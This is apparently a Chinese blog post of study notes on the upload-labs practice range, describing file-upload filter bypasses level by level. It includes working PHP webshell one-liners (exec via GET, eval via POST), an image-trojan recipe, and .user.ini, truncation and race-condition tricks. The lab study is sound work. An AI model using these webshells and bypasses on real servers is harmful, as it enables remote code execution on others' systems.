---
title: "靶场学习笔记之UploadLabs"
date: "2021-02-25T10:26:16+08:00"
description: "其间WindowsDefender报毒file: C:\\Windows\\php7CC0.tmp,经过搜索发现这个是php上传文件的缓存。加入wd的排除项就可以了。"
categories: ["信息安全","渗透测试","专项靶场"]
tags: ["渗透测试", "Web安全", "文件上传", "MSF", "靶场", "Windows", "Hexo", "博客搭建"]
legacyPath: "/posts/1d8a7fa0.html"
topic: security
subtopic: blogging
qualityScore: 90
---
<p>本篇对文件上传的学习做了记录。</p>

<h3 id="UploadLabs"><a href="#UploadLabs" class="headerlink" title="UploadLabs"></a>UploadLabs</h3><h4 id="Pass1"><a href="#Pass1" class="headerlink" title="Pass1"></a>Pass1</h4><p>这关使用文件后缀白名单的方式，在前端检测了文件类型。</p>
<p>直接用burp修改请求绕过就行。</p>
<p>其间WindowsDefender报毒file: C:\Windows\php7CC0.tmp,经过搜索发现这个是php上传文件的缓存。加入wd的排除项就可以了。</p>
<h4 id="Pass2"><a href="#Pass2" class="headerlink" title="Pass2"></a>Pass2</h4><p>这关是在后端进行了检查，使用的Content-Type白名单，包括image/jpeg,image/png,image/gif</p>
<p>绕过方式同Less1</p>
<h4 id="Pass3"><a href="#Pass3" class="headerlink" title="Pass3"></a>Pass3</h4><p>在后端做了黑名单检查。提示不允许上传asp,jsp,php后缀的文件。</p>
<p>经过搜索发现可以传phtml,phm,phs,ph5等。不过这些后缀需要在对应的web服务器中进行配置才能用php解析。在网上搜到的博客基本都是说</p>
<blockquote>
<p>需要在apache/conf/httpd.conf配置文件中有:</p>
<p>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</p>
</blockquote>
<p>但是经过测试发现并没有用。恶补了一下apache和php相关的知识，发现这种方式只在php是module运行模式下起作用（upload-labs官方说明了环境搭建时使用module方式连接，当时没有注意）。而我用的是phpstudy，默认使用的fastcgi模式，所以并不起作用。</p>
<p>如果想在fcgi模式下用php解析特定后缀，需要修改fcgi解析后缀，但是不建议这么修改。建议使用伪静态的方式把来自不同后缀的请求定位到php文件。</p>
<h4 id="Pass4"><a href="#Pass4" class="headerlink" title="Pass4"></a>Pass4</h4><p>黑名单了phtml,phm,等。但是可以使用.htaccess</p>
<h4 id="Pass5"><a href="#Pass5" class="headerlink" title="Pass5"></a>Pass5</h4><p>上传.user.ini</p>
<p>其中写auto_prepend_file=01.gif，其它所有php都会预加载01.gif</p>
<p>然后再上传名为01.gif的一句话木马</p>
<p>只要是以fastcgi运行的php都可以用这个方法</p>
<h4 id="Pass6"><a href="#Pass6" class="headerlink" title="Pass6"></a>Pass6</h4><p>大小写绕过</p>
<h4 id="Pass7"><a href="#Pass7" class="headerlink" title="Pass7"></a>Pass7</h4><p>加空格绕过</p>
<h4 id="Pass8"><a href="#Pass8" class="headerlink" title="Pass8"></a>Pass8</h4><p>加.绕过</p>
<p>windows会自动删除最后一个点</p>
<h4 id="Pass9"><a href="#Pass9" class="headerlink" title="Pass9"></a>Pass9</h4><p>::$data绕过</p>
<h4 id="Pass10"><a href="#Pass10" class="headerlink" title="Pass10"></a>Pass10</h4><p>. .绕过</p>
<p>代码规则是：</p>
<ol>
<li>首位去空</li>
<li>末尾删点</li>
<li>取第一个点后的字符串</li>
<li>转为小写</li>
<li>删去::$DATA</li>
<li>首尾去空</li>
</ol>
<p>php. .</p>
<h4 id="Pass11"><a href="#Pass11" class="headerlink" title="Pass11"></a>Pass11</h4><p>把特定后缀替换为空，直接双写绕过</p>
<h4 id="Pass12"><a href="#Pass12" class="headerlink" title="Pass12"></a>Pass12</h4><p>因为这关传输了文件的保存路径，在路径里面增加%00进行截断字符串。文件名就没意义了。</p>
<h4 id="Pass13"><a href="#Pass13" class="headerlink" title="Pass13"></a>Pass13</h4><p>还是00截断，GET方式变为POST方式</p>
<p>POST不会像GET对%00进行自动解码<br>需要用burp在二进制中进行修改</p>
<p>将70 68 70后面的2b改为00</p>
<h4 id="Pass14"><a href="#Pass14" class="headerlink" title="Pass14"></a>Pass14</h4><p>只读前两字节判断文件是否合法</p>
<p>制作图片马：</p>
<ul>
<li>cmd<code>copy 1.jpg/b 1.php/a 2.jpg</code>,把1.jpg（二进制）和2.php（ASCII）先后写入2.jpg</li>
<li>powershell<code>echo &lt;?php echo(exec($_GET[&#39;cmd&#39;]));?&gt;|out-file -append -encoding ascii 1.jpg</code>，直接追加ASCII格式的内容到1.jpg</li>
<li>直接上传，文件包含执行。</li>
</ul>
<h4 id="Pass15"><a href="#Pass15" class="headerlink" title="Pass15"></a>Pass15</h4><p>getimagesize获取文件信息，判断是否是jpeg png gif</p>
<h4 id="Pass16"><a href="#Pass16" class="headerlink" title="Pass16"></a>Pass16</h4><p>exif_imagetype模块检测，同样是检测前两个字节</p>
<h4 id="Pass17"><a href="#Pass17" class="headerlink" title="Pass17"></a>Pass17</h4><p>图片被二次渲染</p>
<h5 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h5><p>将渲染后的图片下载，用winhex和原图片对比。直接修改二进制，将payload添加在原图片没有变的位置。</p>
<h5 id="png"><a href="#png" class="headerlink" title="png"></a>png</h5><p><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">参见这里</a></p>
<h4 id="Pass18"><a href="#Pass18" class="headerlink" title="Pass18"></a>Pass18</h4><p>代码逻辑有问题，先把文件上传，再判断文件是否合法。不合法删除，合法重命名。</p>
<p>直接用burp intruder，在文件被删前访问。</p>
<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;ant&#39;]); ?&gt;&#39;);?&gt;<br></code></pre></td></tr></table></figure>

<p>burp上传抓包，然后用nullpayload</p>
<p>写python脚本，一直访问，直到html.status_code==200</p>
<h4 id="Pass19-条件竞争"><a href="#Pass19-条件竞争" class="headerlink" title="Pass19 条件竞争"></a>Pass19 条件竞争</h4><p>同样是代码逻辑问题，先把文件上传，再判断是否需要处理。</p>
<p>用burp intruder上传图片马，写python在被(重命名+重新渲染+移动)之前用文件包含访问。</p>
<p>这道题的文件上传路径是根目录下，upload1.png。看起来是路径中少了一个斜杠。</p>
<p>应该是作者代码出现了错误，看了下代码，找到了问题= =。修复后在github提了个pull request。</p>
<h4 id="Pass20"><a href="#Pass20" class="headerlink" title="Pass20"></a>Pass20</h4><p>在文件名后面加<code>/.</code>绕过</p>
<p>点绕过 空格绕过</p>
<p>apache解析漏洞 a.php.adsfg</p>
<h4 id="Pass21"><a href="#Pass21" class="headerlink" title="Pass21"></a>Pass21</h4><p>看代码，发现步骤是这样的</p>
<ol>
<li>检查了Content-Type和POST 参数中的save_name。</li>
<li>如果save_name不是数组，则用<code>.</code>explode成数组</li>
<li>先检查end(save_name)是否是 jpg png gif</li>
<li>然后save_name=reset(save_name).’.’.save_name(count(svae_name)-1)，也就是如果save_name是a.b.c.d,就重命名成a.d</li>
</ol>
<p>最关键的一点是，它判断了save_name是不是数组，如果正常上传肯定不是，所以会用<code>.</code>来分割成数组，然后再进行后面的判断。</p>
<p>那我们直接用burp，传个save_name的数组</p>
<p>save_name[0]=’a.php’</p>
<p>save_name[2]=’jpg’</p>
<p>这里是利用了php的特性，在这种情况下count(save_name)=2</p>
<p>那么count(save_name)-1=1，但savename[1]为空，所以第四步拼接完成后结果是a.php</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>了解了文件上传思路，图片马和文件包含的结合利用方式，各种绕过方法。之后需要熟悉下各种解析漏洞。</p>
